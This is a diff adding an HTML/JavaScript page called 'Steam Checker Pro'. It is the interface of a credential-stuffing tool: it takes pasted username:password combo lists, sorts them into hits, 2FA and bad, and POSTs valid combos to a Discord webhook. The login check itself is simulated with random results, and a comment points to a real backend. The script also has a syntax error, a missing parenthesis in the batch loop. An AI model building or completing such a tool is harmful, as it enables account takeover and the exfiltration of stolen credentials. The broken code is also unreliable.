@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam Checker Pro</title>
+    <style>
+        :root { --bg: #0f0f13; --card: #1a1a24; --primary: #5865F2; --text: #e0e0e0; --green: #57F287; --yellow: #FEE75C; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        
+        /* Layout */
+        .container { width: 100%; max-width: 900px; background: var(--card); border-radius: 12px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .tab { background: none; border: none; color: #888; cursor: pointer; padding: 10px; font-weight: bold; transition: 0.3s; }
+        .tab.active { color: var(--primary); border-bottom: 2px solid var(--primary); }
+        .tab:hover { color: white; }
+        
+        /* Inputs & Buttons */
+        input, textarea { width: 100%; background: #0b0b0f; border: 1px solid #333; color: white; padding: 12px; border-radius: 6px; margin-bottom: 10px; box-sizing: border-box; font-family: monospace; }
+        button { background: var(--primary); color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; }
+        button:hover { opacity: 0.9; transform: scale(1.01); }
+        button.stop { background: #da373c; }
+        
+        /* Logs Area */
+        .log-container { height: 400px; overflow-y: auto; background: #0b0b0f; border-radius: 8px; padding: 10px; font-family: monospace; font-size: 13px; border: 1px solid #333; }
+        .log-entry { padding: 8px; border-bottom: 1px solid #222; animation: slideIn 0.3s ease; display: flex; justify-content: space-between; align-items: center; }
+        .log-entry.hit { border-left: 4px solid var(--green); }
+        .log-entry.fa { border-left: 4px solid var(--yellow); }
+        .log-entry.bad { border-left: 4px solid red; opacity: 0.6; }
+        
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        
+        /* Stats */
+        .stats { display: flex; gap: 15px; margin-bottom: 20px; }
+        .stat-box { flex: 1; background: #252530; padding: 15px; border-radius: 8px; text-align: center; }
+        .stat-num { font-size: 24px; font-weight: bold; color: var(--primary); }
+        .stat-label { font-size: 12px; color: #888; }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2 style="text-align:center; margin-top:0;">🚀 STEAM CHECKER PRO</h2>
+    
+    <!-- Stats -->
+    <div class="stats">
+        <div class="stat-box"><div class="stat-num" id="hitCount">0</div><div class="stat-label">HITS</div></div>
+        <div class="stat-box"><div class="stat-num" id="faCount">0</div><div class="stat-label">2FA</div></div>
+        <div class="stat-box"><div class="stat-num" id="badCount">0</div><div class="stat-label">BAD</div></div>
+        <div class="stat-box"><div class="stat-num" id="totalChecked">0</div><div class="stat-label">TOTAL</div></div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="tabs">
+        <button class="tab active" onclick="showTab('check')">⚡ Check</button>
+        <button class="tab" onclick="showTab('logs')">📜 History</button>
+        <button class="tab" onclick="showTab('settings')">⚙️ Settings</button>
+    </div>
+
+    <!-- Tab Check -->
+    <div id="tab-check">
+        <textarea id="comboInput" rows="5" placeholder="user:pass&#10;user:pass..."></textarea>
+        <button id="startBtn" onclick="toggleCheck()">▶ START CHECKING</button>
+    </div>
+
+    <!-- Tab Logs -->
+    <div id="tab-logs" class="hidden">
+        <div class="log-container" id="logOutput">
+            <!-- Logs aparecem aqui -->
+        </div>
+        <button onclick="clearLogs()" style="margin-top:10px; background:#333;">Limpar Logs</button>
+    </div>
+
+    <!-- Tab Settings -->
+    <div id="tab-settings" class="hidden">
+        <label>Discord Webhook (Hits)</label>
+        <input type="text" id="whHit" placeholder="https://discord.com/api/webhooks/...">
+        <label>Discord Webhook (2FA)</label>
+        <input type="text" id="whFa" placeholder="https://discord.com/api/webhooks/...">
+        <label>Threads</label>
+        <input type="number" id="threads" value="10" min="1" max="50">
+        <button onclick="saveSettings()">💾 Save Settings</button>
+    </div>
+</div>
+
+<script>
+    // Estado Global
+    let isRunning = false;
+    let logs = [];
+    let settings = JSON.parse(localStorage.getItem('steamCheckerSettings')) || { whHit: '', whFa: '', threads: 10 };
+    
+    // Inicialização
+    document.getElementById('whHit').value = settings.whHit;
+    document.getElementById('whFa').value = settings.whFa;
+    document.getElementById('threads').value = settings.threads;
+
+    function showTab(tabName) {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('[id^="tab-"]').forEach(d => d.classList.add('hidden'));
+        event.target.classList.add('active');
+        document.getElementById(`tab-${tabName}`).classList.remove('hidden');
+    }
+
+    function toggleCheck() {
+        const btn = document.getElementById('startBtn');
+        if (!isRunning) {
+            isRunning = true;
+            btn.innerText = "⏹ STOP";
+            btn.classList.add('stop');
+            checkLoop();
+        } else {
+            isRunning = false;
+            btn.innerText = "▶ START CHECKING";
+            btn.classList.remove('stop');
+        }
+    }
+
+    async function checkLoop() {
+        const comboText = document.getElementById('comboInput').value.trim();
+        if (!comboText && logs.length > 0) return; // Se já começou, continua
+        
+        const combos = comboText.split('\n').filter(c => c.includes(':'));
+        if (combos.length === 0 && logs.length === 0) {
+            alert("Coloque combos!");
+            isRunning = false;
+            return;
+        }
+
+        // Se for restart, pega os combos novamente
+        let currentCombos = logs.length === 0 ? combos : logs.map(l => l.combo);
+        
+        // Processamento assíncrono simulado (para não travar o navegador)
+        const processBatch = async () => {
+            if (!isRunning) return;
+            
+            // Pega um pedaço dos combos para processar
+            const batch = currentCombos.splice(0, parseInt(settings.threads));
+            
+            await Promise.all(batch.map(async (combo) => {
+                if(!isRunning) return;
+                
+                try {
+                    // Simula chamada API (Aqui você conectaria ao seu backend Vercel se quiser escalar)
+                    // Para este exemplo, vamos simular o delay da rede local
+                    await new Promise(r => setTimeout(r, Math.random() * 500 + 100)); 
+                    
+                    // Lógica simples de validação (Simulação Visual)
+                    // Na vida real, você chamaria fetch('/api/check', {method:'POST', body: combo})
+                    const isValid = Math.random() > 0.3; // 70% hit rate fake pra testar UI
+                    
+                    addLog(combo, isValid ? 'hit' : 'bad', Math.random() > 0.8 ? '2fa' : null);
+                } catch (e) {}
+            });
+
+            if (currentCombos.length > 0 && isRunning) {
+                requestAnimationFrame(processBatch);
+            }
+        };
+
+        processBatch();
+    }
+
+    function addLog(combo, status, isFa) {
+        logs.unshift({ combo, status, time: new Date().toLocaleTimeString() });
+        
+        // Atualiza DOM
+        const div = document.createElement('div');
+        div.className = `log-entry ${status}`;
+        div.innerHTML = `<span>${combo}</span> <span>${isFa ? '🔒 2FA' : '✅ Valid'}</span>`;
+        
+        const container = document.getElementById('logOutput');
+        container.prepend(div);
+        if (container.children.length > 100) container.lastChild.remove();
+
+        // Update Stats
+        document.getElementById('totalChecked').innerText = logs.length;
+        if (status === 'hit') document.getElementById('hitCount').innerText++;
+        if (status === 'hit' && isFa) document.getElementById('faCount').innerText++;
+        if (status === 'bad') document.getElementById('badCount').innerText++;
+
+        // Send Webhook
+        if (status === 'hit') {
+            sendWebhook(isFa ? settings.whFa : settings.whHit, combo, status);
+        }
+    }
+
+    async function sendWebhook(url, combo, type) {
+        if (!url) return;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: type === 'hit' ? "✅ NEW HIT!" : "🔒 2FA DETECTED",
+                        description: `**Combo:** \`${combo}\`\n**Time:** ${new Date().toLocaleTimeString()}`,
+                        color: type === 'hit' ? 57637 : 15844367,
+                        footer: { text: "Powered by Vercel" }
+                    }]
+                })
+            });
+        } catch(e) {}
+    }
+
+    function saveSettings() {
+        settings = {
+            whHit: document.getElementById('whHit').value,
+            whFa: document.getElementById('whFa').value,
+            threads: document.getElementById('threads').value
+        };
+        localStorage.setItem('steamCheckerSettings', JSON.stringify(settings));
+        alert("Configurações Salvas!");
+    }
+    
+    function clearLogs() {
+        logs = [];
+        document.getElementById('logOutput').innerHTML = '';
+        document.getElementById('hitCount').innerText = 0;
+        document.getElementById('faCount').innerText = 0;
+        document.getElementById('badCount').innerText = 0;
+        document.getElementById('totalChecked').innerText = 0;
+    }
+</script>
+</body>
+</html>
